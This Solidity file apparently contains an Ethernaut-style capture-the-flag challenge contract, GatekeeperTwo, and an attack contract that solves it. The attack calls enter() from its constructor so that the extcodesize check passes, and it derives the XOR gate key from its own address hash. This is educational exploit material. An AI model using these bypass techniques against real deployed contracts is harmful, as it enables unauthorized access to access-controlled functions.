// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoAttack {
    address immutable gatekeeperTwo;
    bytes8 public immutable key;

    constructor(address _gatekeeperTwo) {
        key = bytes8(
            type(uint64).max -
                uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
        );

        GatekeeperTwo(_gatekeeperTwo).enter(key);

        gatekeeperTwo = _gatekeeperTwo;
    }

    /// @dev Helper functions
    function getAddress64() public view returns (uint256) {
        return uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    }

    function getMax() public pure returns (uint256) {
        return type(uint64).max;
    }

    /// @notice This is will return the key as a number...
    function getDifference() public view returns (uint256) {
        return
            type(uint64).max -
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    }

    function getKey64(bytes8 _key) public pure returns (uint256) {
        return uint64(_key);
    }

    function getXOR(bytes8 _key) public view returns (uint256) {
        uint256 xor = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ uint64(_key);
        return xor;
    }
}
